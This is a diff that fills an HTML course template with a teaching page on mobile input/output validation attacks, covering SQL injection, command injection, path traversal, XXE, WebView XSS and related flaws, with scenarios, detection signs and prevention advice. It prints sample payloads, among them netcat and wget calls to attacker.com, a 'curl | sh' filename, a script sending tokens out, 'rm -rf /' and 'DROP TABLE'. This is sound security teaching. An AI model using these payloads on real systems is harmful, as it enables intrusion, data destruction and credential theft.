@@ -215,7 +215,596 @@
         </a>
         
         <div class="content">
-{CONTENT}
+            <h1>M04: Insufficient Input/Output Validation - Attack Vectors</h1>
+
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#understanding-inputoutput-validation-attacks">Understanding Input/Output Validation Attacks</a></li>
+<li><a href="#input-validation-attack-vectors">Input Validation Attack Vectors</a></li>
+<li><a href="#output-validation-attack-vectors">Output Validation Attack Vectors</a></li>
+<li><a href="#attack-scenarios">Attack Scenarios</a></li>
+<li><a href="#attack-chain-analysis">Attack Chain Analysis</a></li>
+<li><a href="#exploitation-techniques">Exploitation Techniques</a></li>
+</ul>
+
+<h2>Understanding Input/Output Validation Attacks</h2>
+
+<p>Input/output validation attacks exploit the application's failure to properly sanitize, validate, or encode data flowing in and out of the mobile application. These attacks can occur at multiple layers: user input, API communications, local storage, and data display.</p>
+
+<h3>The Trust Boundary Problem</h3>
+
+<p>``<code></p>
+<p>External Data Sources → Mobile App → Backend/Storage → Mobile App → Display</p>
+<p>        ↓                    ↓              ↓              ↓           ↓</p>
+<p>    Untrusted           Validate?      Validate?      Encode?     Sanitize?</p>
+</code>`<code>
+
+<h2>Input Validation Attack Vectors</h2>
+
+<h3>1. SQL Injection (SQLi)</h3>
+
+<strong>Attack Flow:</strong>
+</code>`<code>
+<p>User Input: ' OR '1'='1</p>
+<p>    ↓</p>
+<p>Query: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''</p>
+<p>    ↓</p>
+<p>Result: Authentication bypass, all users returned</p>
+</code>`<code>
+
+<strong>Mobile-Specific Scenarios:</strong>
+<ul>
+<li>Local SQLite database queries</li>
+<li>API parameters sent to backend</li>
+<li>Search functionality</li>
+<li>Filter operations</li>
+<li>Deep link parameters</li>
+</ul>
+
+<strong>Example Attack Payloads (Conceptual):</strong>
+</code>`<code>
+<p>' OR 1=1--</p>
+<p>'; DROP TABLE users--</p>
+<p>' UNION SELECT password FROM users--</p>
+<p>admin'--</p>
+</code>`<code>
+
+<strong>Impact:</strong>
+<ul>
+<li>Data exfiltration</li>
+<li>Data modification/deletion</li>
+<li>Authentication bypass</li>
+<li>Privilege escalation</li>
+</ul>
+
+<h3>2. Command Injection</h3>
+
+<strong>Attack Flow:</strong>
+</code>`<code>
+<p>User Input: file.txt; rm -rf /</p>
+<p>    ↓</p>
+<p>System Command: cat file.txt; rm -rf /</p>
+<p>    ↓</p>
+<p>Result: File deletion, system compromise</p>
+</code>`<code>
+
+<strong>Mobile Attack Surfaces:</strong>
+<ul>
+<li>File name processing</li>
+<li>URL schemes</li>
+<li>Native bridge calls</li>
+<li>System utility invocations</li>
+<li>Shell command execution</li>
+</ul>
+
+<strong>Conceptual Payloads:</strong>
+</code>`<code>
+<p>file.txt && malicious-command</p>
+<p>file.txt | nc attacker.com 4444</p>
+<p>$(wget http://attacker.com/shell.sh)</p>
+</code>`<code>
+
+<h3>3. Path Traversal</h3>
+
+<strong>Attack Flow:</strong>
+</code>`<code>
+<p>User Input: ../../etc/passwd</p>
+<p>    ↓</p>
+<p>File Access: /app/files/../../etc/passwd</p>
+<p>    ↓</p>
+<p>Result: Access to system files outside app sandbox</p>
+</code>`<code>
+
+<strong>Mobile-Specific Paths:</strong>
+</code>`<code>
+<p>../../../data/data/com.app/databases/</p>
+<p>..%2f..%2f..%2fshared_prefs/</p>
+<p>....//....//sensitive_file.xml</p>
+</code>`<code>
+
+<strong>Targets:</strong>
+<ul>
+<li>File upload/download functionality</li>
+<li>Document viewers</li>
+<li>Cache management</li>
+<li>Backup/restore features</li>
+<li>Image/media loading</li>
+</ul>
+
+<h3>4. XML/JSON Injection</h3>
+
+<strong>XML External Entity (XXE) Attack:</strong>
+</code>`<code>xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+<p>]></p>
+<user>
+  <name>&xxe;</name>
+</user>
+</code>`<code>
+
+<strong>JSON Injection:</strong>
+</code>`<code>json
+<p>{</p>
+<p>  "user": "admin",</p>
+<p>  "role": "user\",\"role\":\"admin"</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Mobile Contexts:</strong>
+<ul>
+<li>API request/response parsing</li>
+<li>Configuration file parsing</li>
+<li>Deep link data</li>
+<li>QR code data processing</li>
+</ul>
+
+<h3>5. Cross-Site Scripting (XSS) in WebViews</h3>
+
+<strong>Stored XSS Attack:</strong>
+</code>`<code>javascript
+<script>
+<p>  // Exfiltrate session tokens</p>
+<p>  fetch('http://attacker.com/?token=' + localStorage.getItem('token'));</p>
+</script>
+</code>`<code>
+
+<strong>Reflected XSS:</strong>
+</code>`<code>
+<p>myapp://search?q=<script>alert(document.cookie)</script></p>
+</code>`<code>
+
+<strong>Mobile WebView Risks:</strong>
+<ul>
+<li>JavaScript bridge exploitation</li>
+<li>Cookie theft</li>
+<li>Local storage access</li>
+<li>Camera/location access via WebView APIs</li>
+</ul>
+
+<h3>6. Integer Overflow/Underflow</h3>
+
+<strong>Attack Scenario:</strong>
+</code>`<code>
+<p>Input: 2147483647 (MAX_INT)</p>
+<p>Operation: +1</p>
+<p>Result: -2147483648 (wraps around)</p>
+</code>`<code>
+
+<strong>Mobile Applications:</strong>
+<ul>
+<li>In-app purchase amount manipulation</li>
+<li>Counter/score manipulation</li>
+<li>Resource allocation (memory, storage)</li>
+<li>Transaction amounts</li>
+</ul>
+
+<h3>7. Buffer Overflow</h3>
+
+<strong>Attack Pattern:</strong>
+</code>`<code>
+<p>Expected Input: 10 characters</p>
+<p>Actual Input: 1000 characters</p>
+<p>Result: Memory corruption, potential code execution</p>
+</code>`<code>
+
+<strong>Mobile Native Code Risks:</strong>
+<ul>
+<li>JNI/NDK functions</li>
+<li>Native library calls</li>
+<li>C/C++ components</li>
+<li>Custom protocol parsers</li>
+</ul>
+
+<h3>8. Format String Attacks</h3>
+
+<strong>Conceptual Attack:</strong>
+</code>`<code>
+<p>Input: %x %x %x %x %x</p>
+<p>Logging: printf(user_input)</p>
+<p>Result: Memory disclosure</p>
+</code>`<code>
+
+<strong>Mobile Logging Issues:</strong>
+<ul>
+<li>Debug logs with user input</li>
+<li>Error messages</li>
+<li>Analytics data</li>
+<li>Crash reports</li>
+</ul>
+
+<h2>Output Validation Attack Vectors</h2>
+
+<h3>1. Improper Output Encoding</h3>
+
+<strong>HTML Context:</strong>
+</code>`<code>javascript
+<p>// Vulnerable</p>
+<p>webView.loadData("<html><body>" + userInput + "</body></html>")</p>
+
+<p>// Attack Input: <script>malicious()</script></p>
+<p>// Result: XSS execution</p>
+</code>`<code>
+
+<strong>JavaScript Context:</strong>
+</code>`<code>javascript
+<p>// Vulnerable</p>
+<p>webView.loadUrl("javascript:search('" + query + "')")</p>
+
+<p>// Attack Input: '); malicious(); //</p>
+<p>// Result: Arbitrary JavaScript execution</p>
+</code>`<code>
+
+<h3>2. Log Injection</h3>
+
+<strong>Attack:</strong>
+</code>`<code>
+<p>Username: admin\n[INFO] Authentication successful for root</p>
+<p>Actual Log:</p>
+<p>[INFO] Login attempt: admin</p>
+<p>[INFO] Authentication successful for root</p>
+</code>`<code>
+
+<strong>Impact:</strong>
+<ul>
+<li>Log poisoning</li>
+<li>Audit trail manipulation</li>
+<li>SIEM evasion</li>
+<li>Incident response confusion</li>
+</ul>
+
+<h3>3. Data Leakage via Improper Sanitization</h3>
+
+<strong>Sensitive Data Exposure:</strong>
+</code>`<code>
+<p>// Error message includes sensitive data</p>
+<p>"Database error: connection failed to db.internal:3306 with password 'P@ssw0rd123'"</p>
+</code>`<code>
+
+<strong>Information Disclosure:</strong>
+<ul>
+<li>Stack traces with paths</li>
+<li>Database error messages</li>
+<li>API error responses</li>
+<li>Debug information</li>
+</ul>
+
+<h2>Attack Scenarios</h2>
+
+<h3>Scenario 1: SQLi in Mobile Banking App</h3>
+
+</code>`<code>
+<p>Attack Flow:</p>
+<ol>
+<li>Attacker opens mobile banking app</li>
+<li>Login screen accepts username/password</li>
+<li>Attacker enters: ' OR '1'='1' --</li>
+<li>App constructs query:</li>
+</ol>
+<p>   SELECT * FROM accounts WHERE username='' OR '1'='1' --' AND password=''</p>
+<ol>
+<li>Query returns all accounts</li>
+<li>Attacker gains access to first admin account</li>
+<li>Can view all transactions, transfer funds</li>
+</ol>
+</code>`<code>
+
+<strong>Impact:</strong> Complete account compromise, financial fraud
+
+<h3>Scenario 2: Path Traversal in File Manager App</h3>
+
+</code>`<code>
+<p>Attack Flow:</p>
+<ol>
+<li>App allows users to download files</li>
+<li>Filename parameter: /download?file=document.pdf</li>
+<li>Attacker modifies: /download?file=../../../databases/app.db</li>
+<li>App doesn't validate path</li>
+<li>Attacker downloads entire SQLite database</li>
+<li>Database contains user credentials, PII</li>
+</ol>
+</code>`<code>
+
+<strong>Impact:</strong> Data breach, credential theft
+
+<h3>Scenario 3: XSS in Social Media App WebView</h3>
+
+</code>`<code>
+<p>Attack Flow:</p>
+<ol>
+<li>Attacker posts malicious comment with XSS payload</li>
+<li>Victim opens comment in app's WebView</li>
+<li>JavaScript executes in WebView context</li>
+<li>Script accesses JavaScript bridge</li>
+<li>Exfiltrates authentication tokens</li>
+<li>Attacker hijacks victim's account</li>
+</ol>
+</code>`<code>
+
+<strong>Impact:</strong> Account takeover, data theft
+
+<h3>Scenario 4: Command Injection in File Processing</h3>
+
+</code>`<code>
+<p>Attack Flow:</p>
+<ol>
+<li>App allows image upload with conversion</li>
+<li>Backend processes: convert uploaded_file.jpg output.png</li>
+<li>Attacker uploads file named: image.jpg; curl http://attacker.com | sh</li>
+<li>Server executes: convert image.jpg; curl http://attacker.com | sh output.png</li>
+<li>Malicious script downloaded and executed</li>
+<li>Server compromised</li>
+</ol>
+</code>`<code>
+
+<strong>Impact:</strong> Remote code execution, server compromise
+
+<h3>Scenario 5: Integer Overflow in In-App Purchase</h3>
+
+</code>`<code>
+<p>Attack Flow:</p>
+<ol>
+<li>E-commerce app processes purchase</li>
+<li>Price: $99.99, Quantity field accepts input</li>
+<li>Attacker enters quantity: 2147483647</li>
+<li>Calculation: 99.99 * 2147483647 = Integer overflow</li>
+<li>Result: Negative or very small amount</li>
+<li>Transaction processed for $0.01</li>
+<li>Attacker receives expensive items for free</li>
+</ol>
+</code>`<code>
+
+<strong>Impact:</strong> Financial loss, inventory issues
+
+<h2>Attack Chain Analysis</h2>
+
+<h3>Phase 1: Reconnaissance</h3>
+
+<strong>Attacker Activities:</strong>
+<ul>
+<li>Analyze app's input fields</li>
+<li>Test boundary conditions</li>
+<li>Identify validation mechanisms</li>
+<li>Map data flow</li>
+<li>Find injection points</li>
+</ul>
+
+<strong>Tools Used:</strong>
+<ul>
+<li>Proxy tools (Burp Suite, OWASP ZAP)</li>
+<li>Decompilers (jadx, apktool)</li>
+<li>Debuggers (Frida, lldb)</li>
+<li>Fuzzing tools</li>
+</ul>
+
+<h3>Phase 2: Vulnerability Identification</h3>
+
+<strong>Testing Methods:</strong>
+<ul>
+<li>Fuzzing input fields</li>
+<li>Boundary value analysis</li>
+<li>Special character injection</li>
+<li>Format string testing</li>
+<li>Path traversal attempts</li>
+<li>SQL injection payloads</li>
+</ul>
+
+<strong>Indicators of Vulnerability:</strong>
+<ul>
+<li>Error messages revealing structure</li>
+<li>Unexpected app behavior</li>
+<li>Database errors</li>
+<li>File access errors</li>
+<li>Command execution signs</li>
+</ul>
+
+<h3>Phase 3: Exploitation</h3>
+
+<strong>Attack Execution:</strong>
+<ul>
+<li>Craft specific payload</li>
+<li>Bypass client-side validation</li>
+<li>Exploit server-side weakness</li>
+<li>Chain multiple vulnerabilities</li>
+<li>Maintain persistence</li>
+</ul>
+
+<strong>Techniques:</strong>
+<ul>
+<li>Parameter manipulation</li>
+<li>Request interception/modification</li>
+<li>Encoding/decoding tricks</li>
+<li>Logic abuse</li>
+<li>Race conditions</li>
+</ul>
+
+<h3>Phase 4: Post-Exploitation</h3>
+
+<strong>Attacker Goals:</strong>
+<ul>
+<li>Data exfiltration</li>
+<li>Privilege escalation</li>
+<li>Lateral movement</li>
+<li>Persistence establishment</li>
+<li>Cover tracks</li>
+</ul>
+
+<h2>Exploitation Techniques</h2>
+
+<h3>1. Client-Side Validation Bypass</h3>
+
+<strong>Technique:</strong>
+</code>`<code>
+<ol>
+<li>Intercept request with proxy</li>
+<li>Modify parameters after client validation</li>
+<li>Send modified request to server</li>
+<li>Server processes without validation</li>
+</ol>
+</code>`<code>
+
+<strong>Prevention Requirement:</strong> Server-side validation mandatory
+
+<h3>2. Encoding/Obfuscation</h3>
+
+<strong>URL Encoding:</strong>
+</code>`<code>
+<p>../../../ → %2e%2e%2f%2e%2e%2f%2e%2e%2f</p>
+<script> → %3Cscript%3E
+</code>`<code>
+
+<strong>Double Encoding:</strong>
+</code>`<code>
+<p>../ → %252e%252e%252f</p>
+</code>`<code>
+
+<strong>Unicode Bypasses:</strong>
+</code>`<code>
+<p>../ → ..%c0%af</p>
+< → \u003c
+</code>`<code>
+
+<h3>3. Null Byte Injection</h3>
+
+<strong>Technique:</strong>
+</code>`<code>
+<p>filename.pdf%00.jpg</p>
+<p>→ Server validates .jpg extension</p>
+<p>→ System processes as .pdf (truncates at null byte)</p>
+</code>`<code>
+
+<h3>4. CRLF Injection</h3>
+
+<strong>HTTP Header Injection:</strong>
+</code>`<code>
+<p>Input: value\r\nSet-Cookie: session=attacker</p>
+<p>Result: Injected header in HTTP response</p>
+</code>`<code>
+
+<h3>5. Race Conditions</h3>
+
+<strong>TOCTOU (Time-of-Check-Time-of-Use):</strong>
+</code>`<code>
+<ol>
+<li>Request validation check</li>
+<li>Between check and use, modify data</li>
+<li>Invalid data processed</li>
+</ol>
+</code>``
+
+<h2>Detection Indicators</h2>
+
+<h3>Application Behavior</h3>
+
+<strong>Signs of SQLi:</strong>
+<ul>
+<li>Database error messages</li>
+<li>Slow query responses</li>
+<li>Different responses for ' vs "</li>
+<li>Boolean-based response differences</li>
+</ul>
+
+<strong>Signs of Command Injection:</strong>
+<ul>
+<li>Delayed responses (sleep commands)</li>
+<li>DNS lookbacks</li>
+<li>Network connections</li>
+<li>Process spawning</li>
+</ul>
+
+<strong>Signs of Path Traversal:</strong>
+<ul>
+<li>Access to unexpected files</li>
+<li>Error messages about file paths</li>
+<li>Directory listings</li>
+<li>Sensitive file content</li>
+</ul>
+
+<h3>Network Traffic</h3>
+
+<strong>Suspicious Patterns:</strong>
+<ul>
+<li>Encoded special characters in requests</li>
+<li>Unusual parameter values</li>
+<li>Repeated injection attempts</li>
+<li>Automated scanning patterns</li>
+</ul>
+
+<h2>Risk Assessment</h2>
+
+<h3>Critical Risk Scenarios</h3>
+
+<ul>
+<li>SQL injection in authentication</li>
+<li>Command injection in file processing</li>
+<li>Path traversal with write access</li>
+<li>XSS with JavaScript bridge access</li>
+<li>Integer overflow in financial transactions</li>
+</ul>
+
+<h3>High Risk Scenarios</h3>
+
+<ul>
+<li>JSON/XML injection in API</li>
+<li>LDAP injection</li>
+<li>XPath injection</li>
+<li>Template injection</li>
+<li>File inclusion vulnerabilities</li>
+</ul>
+
+<h3>Medium Risk Scenarios</h3>
+
+<ul>
+<li>Log injection</li>
+<li>HTTP header injection</li>
+<li>Email header injection</li>
+<li>CSV injection</li>
+</ul>
+
+<h2>Key Takeaways</h2>
+
+<ol>
+<li><strong>Never trust user input - validate everything</strong></li>
+<li><strong>Validate on server-side, not just client-side</strong></li>
+<li><strong>Use parameterized queries, never string concatenation</strong></li>
+<li><strong>Encode output based on context (HTML, JavaScript, SQL)</strong></li>
+<li><strong>Implement defense-in-depth: input validation + output encoding + least privilege</strong></li>
+<li><strong>Regular security testing including fuzzing and penetration testing</strong></li>
+</ol>
+
+<h2>Next Steps</h2>
+
+<ul>
+<li><strong><a href="./prevention.md">Prevention Guide</a></strong>: Learn comprehensive validation techniques</li>
+<li><strong><a href="./examples.md">Examples</a></strong>: See vulnerable vs secure code</li>
+<li><strong><a href="./lab/">Interactive Lab</a></strong>: Practice identifying and fixing validation issues</li>
+</ul>
+
+<p>---</p>
+
+<strong>Remember</strong>: Assume all input is malicious until proven otherwise. Validate on input, encode on output.
+
         </div>
     </div>
 </body>
